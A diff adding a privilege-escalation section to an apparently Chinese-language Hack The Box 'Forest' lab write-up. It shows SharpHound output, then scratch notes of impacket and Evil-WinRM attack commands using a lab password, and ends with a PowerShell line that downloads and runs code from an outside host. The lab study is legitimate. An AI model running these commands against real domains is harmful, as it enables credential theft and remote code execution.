@@ -290,3 +290,136 @@ htb\svc-alfresco
 ```
 
 # 提权
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> .\SharpHound.exe -c all --zipfilename forest.zip
+----------------------------------------------
+Initializing SharpHound at 2:23 AM on 1/5/2022
+----------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
+[+] Cache File Found! Loaded 209 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 23 MB RAM
+Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
+Enumeration finished in 00:00:02.4117046
+Compressing data to .\20220105022302_forest.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 2:23 AM on 1/5/2022! Happy Graphing!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> ls
+
+
+    Directory: C:\Users\svc-alfresco\Downloads
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         1/5/2022   2:23 AM          15303 20220105022302_forest.zip
+-a----         1/4/2022  10:47 PM         833024 SharpHound.exe
+
+```
+
+下载
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip
+Info: Downloading C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip to ./C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip                                                                            
+
+                                                             
+Info: Download successful!
+
+
+```
+
+net group 
+
+.\SharpHound.exe -c all --zipfilename forest.zip
+
+download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip
+
+smbmap -u "svc-alfresco" -p "s3rvice" -H 10.10.10.161
+
+smbclient -U 'svc-alfresco%s3rvice' //10.10.10.161/SYSVOL
+
+mount -t cifs -o 'username=svc-alfresco,password=s3rvice' //10.10.10.161/SYSVOL /mnt/SYSVOL
+
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco  //不行
+
+net group"svc-alfresco" /domain
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb/svc-alfresco:s3rvice@10.10.10.161  //不行
+
+
+
+evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -s '/root/PowerSploit/Recon'
+
+
+
+lookupsid.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+psexec.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+rpcdump.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+samrdump.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+wmiexec.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+psexec.py htb/svc-alfresco:s3rvice@10.10.10.161
+
+
+wmiexec.py forest.htb/svc-alfresco:s3rvice@10.10.10.161 
+
+python3 smbexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 
+python3 psexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 
+
+sebastien
+
+download C:\Users\svc-alfresco\Downloads\MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin 
+
+
+
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/   -dc-ip 10.10.10.161
+
+
+
+GetNPUsers.py htb/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.30
+
+
+
+Find Shortest Paths to Domain Admins
+
+AS-REP roastable users dontreqpreauth
+
+Shortest Paths to Unconstrained Delegation Systems
+
+Shortest Paths to High Value Targets
+
+canpsremote
+hassession
+
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco
+
+secretsdump.py -dc-ip 10.10.10.161 forest.htb.local/svc-alfresco:s3rvice@10.10.10.161
+
+net view forest.htb.local
+
+crackmapexec winrm  10.10.10.161 -u 'svc-alfresco' -p "s3rvice" -d "forest.htb.local"
+
+evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --realm "forest.htb.local"
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred
+
+net group "Account Operators" /domain
+
+
+
+powershell $session = New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session
